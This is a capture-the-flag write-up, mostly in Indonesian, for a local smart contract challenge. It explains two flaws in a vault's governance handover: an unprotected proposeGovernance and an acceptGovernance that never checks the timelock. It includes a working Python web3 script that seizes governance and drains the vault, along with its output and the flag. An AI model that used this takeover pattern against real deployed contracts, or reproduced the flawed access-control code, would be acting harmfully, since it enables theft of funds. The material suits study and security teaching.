# WriteUp - Pwn The Vault

## Overview

* **Judul:** Pwn The Vault
* **Kategori:** Smart Contract
* **Poin:** 50
* **Deskripsi:** Badger DAO has deployed a new VaultZap contract to optimize yield farming across multiple tokens. The contract holds significant value in WBTC, USDC, and BADGER tokens. The development team implemented a governance system for emergency controls, with a two-step transfer process (propose → accept) inspired by OpenZeppelin's Ownable2Step pattern. However, the implementation contains critical flaws... Objective: Take over the governance system, drain the vault, and reveal the hidden flag stored in the FlagManager contract.
* **Author:** -
* **URL:** `http://localhost:8545`

## Attachment Information & Directory Structure

Pemeriksaan awal dilakukan pada struktur direktori di dalam container aplikasi dan hasil *copy* dari source code *smart contract*.

```bash
▶  docker exec badger-zap-challenge ls -la
total 52
drwxr-xr-x  1 root root 4096 Feb 18 15:05 .
drwxr-xr-x  1 root root 4096 Feb 18 15:04 ..
drwxr-xr-x  1 root root 4096 Feb 18 11:01 cache
-rw-r--r--  1 root root  361 Feb 18 15:05 contract_addresses.txt
-rw-r--r--  1 root root  480 Feb 18 05:18 foundry.toml
drwxr-xr-x  4 root root 4096 Feb 18 04:38 lib
drwxr-xr-x 29 root root 4096 Feb 18 11:01 out
-rw-r--r--  1 root root   73 Feb 18 04:39 remappings.txt
drwxr-xr-x  2 root root 4096 Feb 18 11:01 script
drwxr-xr-x  2 root root 4096 Feb 18 11:01 src
drwxr-xr-x  2 root root 4096 Feb 18 06:14 test

▶  tree src/
src/
├── BadgerVaultZap.sol
├── FlagManager.sol
└── MockToken.sol

1 directory, 3 files

▶  docker exec badger-zap-challenge cat contract_addresses.txt
VAULT_ZAP=0x14850b5922456CC027247e205e0E3ce00e23A37c
FLAG_MANAGER=0xa9A290F1AFe7ac7cB4a881A5C00Bcc183018c421
WBTC=0xBCe3951bC42160c72bf238e7e08507feafcB8213
USDC=0xCB1349b58B926bde8f1b168358F4adAE701360dD
BADGER=0x9e522e08d42A9089D6f537cd438C8a17D2f3a259
GOVERNANCE=0xE4Fa77574439f35Cd5694f8b39EBb96De000f880
GUARDIAN=0x28a4FBca65a667b31A9ba9dCe1266955EB423340

```

## Vulnerability Analysis

Kerentanan utama terletak pada file `src/BadgerVaultZap.sol`, tepatnya pada implementasi *Access Control* atau *Governance System* yang dibuat oleh developer.

### 1. Missing Access Control pada `proposeGovernance`

Fungsi yang seharusnya digunakan oleh Governance saat ini untuk menominasikan kandidat pengganti ternyata tidak dilindungi oleh *modifier* apa pun.

```solidity
function proposeGovernance(address _newGovernance) external {
    pendingGovernance = _newGovernance;
    proposalTimestamp = block.timestamp;
    emit GovernanceProposed(_newGovernance, block.timestamp + DELAY);
}

```

Karena bersifat `external` tanpa *modifier* `onlyGovernance`, siapa pun dapat memanggil fungsi ini dan menjadikan dirinya sendiri (atau *address* lain) sebagai `pendingGovernance`.

### 2. Missing Timelock Validation pada `acceptGovernance`

Fungsi `acceptGovernance` memiliki deklarasi variabel `DELAY`, namun sama sekali tidak mengimplementasikan pengecekan waktu eksekusi.

```solidity
function acceptGovernance() external {
    require(msg.sender == pendingGovernance, "Only pending governance");

    address oldGovernance = governance;
    governance = msg.sender;
    pendingGovernance = address(0);

    emit GovernanceChanged(oldGovernance, msg.sender);
}

```

Fungsi ini hanya memvalidasi apakah `msg.sender` sama dengan `pendingGovernance`. Karena penyerang sudah berhasil mengatur dirinya sebagai `pendingGovernance` pada langkah pertama, penyerang dapat langsung memanggil fungsi ini tanpa perlu menunggu `DELAY` (1 hari) selesai.

## Exploitation

Proses eksploitasi (Hostile Takeover) dilakukan dengan langkah-langkah berikut:

1. Memanggil `proposeGovernance(ATTACKER_ADDRESS)` menggunakan *address* penyerang.
2. Memanggil `acceptGovernance()` menggunakan *address* penyerang, secara instan mengubah status penyerang menjadi pemilik / Governance yang sah.
3. Memanggil `extractFunds([TOKEN_ADDRESSES])` untuk menguras seluruh isi *vault*. Fungsi ini memiliki alur logika yang secara otomatis akan mengubah status `flagRevealed` menjadi *true* dan memanggil fungsi `revealFlag()` di dalam `FlagManager`.
4. Memanggil `getFlag()` pada *contract* `FlagManager` untuk mendapatkan flag.

### Script Solver (`exploit.py`)

Skrip eksploitasi dibangun menggunakan library `web3` Python untuk berinteraksi dengan node RPC lokal Anvil yang disediakan oleh Docker.

```python
import json
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

if not w3.is_connected():
    print("[-] Node RPC tidak merespon bro. Cek dockernya!")
    exit()

VAULT_ADDRESS = w3.to_checksum_address("0x14850b5922456CC027247e205e0E3ce00e23A37c")
FLAG_MANAGER_ADDRESS = w3.to_checksum_address("0xa9A290F1AFe7ac7cB4a881A5C00Bcc183018c421")

TOKENS = [
    w3.to_checksum_address("0xBCe3951bC42160c72bf238e7e08507feafcB8213"), 
    w3.to_checksum_address("0xCB1349b58B926bde8f1b168358F4adAE701360dD"), 
    w3.to_checksum_address("0x9e522e08d42A9089D6f537cd438C8a17D2f3a259")  
]

attacker = w3.eth.accounts[1]
print(f"[*] Attacker Address: {attacker}")

vault_abi = [
    {"inputs":[{"internalType":"address","name":"_newGovernance","type":"address"}],"name":"proposeGovernance","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"acceptGovernance","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address[]","name":"_tokens","type":"address[]"}],"name":"extractFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"governance","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
]

flag_abi = [
    {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
]

vault = w3.eth.contract(address=VAULT_ADDRESS, abi=vault_abi)
flag_mgr = w3.eth.contract(address=FLAG_MANAGER_ADDRESS, abi=flag_abi)

def exploit():
    print(f"[*] Current Governance: {vault.functions.governance().call()}")

    print("[*] 1. Executing Hostile Takeover: Proposing attacker as new governance...")
    tx1 = vault.functions.proposeGovernance(attacker).transact({'from': attacker})
    w3.eth.wait_for_transaction_receipt(tx1)

    print("[*] 2. Accepting governance bypass...")
    tx2 = vault.functions.acceptGovernance().transact({'from': attacker})
    w3.eth.wait_for_transaction_receipt(tx2)

    new_gov = vault.functions.governance().call()
    print(f"[+] New Governance is now: {new_gov}")

    if new_gov == attacker:
        print("[*] 3. We are the captain now! Extracting all funds & revealing flag...")
        tx3 = vault.functions.extractFunds(TOKENS).transact({'from': attacker})
        w3.eth.wait_for_transaction_receipt(tx3)

        print("[*] 4. Fetching the flag from FlagManager...")
        flag = flag_mgr.functions.getFlag().call()

        print("\n" + "="*40)
        print("[+] PWNED! Flag Found:")
        print(flag)
        print("="*40 + "\n")
    else:
        print("[-] Takeover gagal bro.")

if __name__ == "__main__":
    exploit()

```

### Output Terminal Eksekusi

```bash
▶  ./exploit.py
[*] Attacker Address: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[*] Current Governance: 0xE4Fa77574439f35Cd5694f8b39EBb96De000f880
[*] 1. Executing Hostile Takeover: Proposing attacker as new governance...
[*] 2. Accepting governance bypass...
[+] New Governance is now: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[*] 3. We are the captain now! Extracting all funds & revealing flag...
[*] 4. Fetching the flag from FlagManager...

========================================
[+] PWNED! Flag Found:
pwn{8d7748e34d087bb5924bf6c259ef5416}
========================================

```

## Flag

```
pwn{8d7748e34d087bb5924bf6c259ef5416}

```
